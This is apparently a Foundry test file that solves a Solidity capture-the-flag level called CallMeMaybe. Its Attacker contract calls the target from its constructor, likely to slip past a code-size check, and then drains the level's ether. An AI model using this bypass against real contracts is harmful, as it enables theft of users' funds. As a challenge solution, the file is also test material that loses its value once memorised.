// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/05_CallMeMaybe/CallMeMaybe.sol";

// forge test --match-contract CallMeMaybeTest -vvvv
contract CallMeMaybeTest is BaseTest {
    CallMeMaybe instance;

    function setUp() public override {
        super.setUp();
        payable(user1).transfer(0.01 ether);
        instance = new CallMeMaybe{value: 0.01 ether}();
    }

    function testExploitLevel() public {
        Attacker attacker = new Attacker(payable(address(instance)));
        attacker.withdraw();

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}

contract Attacker {
    constructor(address payable _target) payable {
        CallMeMaybe(_target).hereIsMyNumber();
    }

    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
